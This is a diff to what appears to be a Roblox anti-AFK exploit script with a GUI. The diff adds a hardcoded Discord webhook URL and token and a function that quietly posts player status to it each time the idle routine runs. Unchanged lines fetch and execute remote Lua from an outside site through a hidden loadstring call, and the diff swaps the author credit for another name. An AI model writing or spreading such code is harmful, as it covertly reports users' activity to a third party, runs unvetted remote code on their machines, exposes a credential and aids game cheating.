@@ -1,3 +1,19 @@
+local HttpService = game:GetService("HttpService")
+local webhookURL = "https://discord.com/api/webhooks/1256741821845995540/JwkpQiiXAJnL1trAFmzusTGJ6_1yczLYmUMf_s-hySF0jrlGWdUU_zjwK6uKdup7n4Sk"
+
+local function sendPlayerStatus(status)
+	local data = {
+		content = "Player Status: " .. status
+	}
+	local jsonData = HttpService:JSONEncode(data)
+	
+	local headers = {
+		["Content-Type"] = "application/json"
+	}
+	
+	HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
+end
+
 coroutine.resume(coroutine.create(pcall), function()
 	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
 end)
@@ -44,7 +60,7 @@ Credits.BorderSizePixel = 0
 Credits.Position = UDim2.new(0, 0, 0.861901641, 0)
 Credits.Size = UDim2.new(0, 295, 0, 16)
 Credits.Font = Enum.Font.GothamBold
-Credits.Text = "Made by DEEX404"
+Credits.Text = "Made by jamess#0007"
 Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
 Credits.TextScaled = true
 Credits.TextSize = 12.000
@@ -68,6 +84,7 @@ Activate.MouseButton1Down:connect(function()
 		vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
 		wait(1)
 		vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+		sendPlayerStatus("Idling")
 	end)
 end)
 
